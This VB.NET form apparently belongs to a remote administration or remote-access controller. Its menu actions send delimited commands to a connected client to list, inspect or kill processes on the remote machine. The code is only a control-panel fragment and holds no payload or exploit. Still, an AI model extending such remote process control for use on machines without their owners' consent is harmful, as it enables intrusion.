Public Class Tasks_Form
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Close()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.WindowState = FormWindowState.Maximized
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Me.WindowState = FormWindowState.Normal
    End Sub

    Private Async Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        '   If ListView2.SelectedItems.Count = 1 Then



        Dim o As String = Form1.PL_TASKS & "|SP1|" & "" & "|SP2|" & "|GETTASKSNOTOLD|" & "|ENDING|"

        Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))

        '  End If
    End Sub

    Private Sub Tasks_Form_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Async Sub KillToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillToolStripMenuItem.Click
        'CLOSETHAT
        If ListView1.SelectedItems.Count = 1 Then



            Dim o As String = Form1.PL_TASKS & "|SP1|" & "" & "|SP2|" & "|CLOSETHAT|" & "|SP2|" & ListView1.SelectedItems(0).Text & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))

        End If
    End Sub

    Private Async Sub InfoProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InfoProcessToolStripMenuItem.Click
        If ListView1.SelectedItems.Count = 1 Then



            Dim o As String = Form1.PL_TASKS & "|SP1|" & "" & "|SP2|" & "|INFO|" & "|SP2|" & ListView1.SelectedItems(0).Text & "|ENDING|"

            Await Task.Run(Sub() SenderHelper.SenderHelper(Form1.CliSt, Label4.Text, o))


        End If
    End Sub
End Class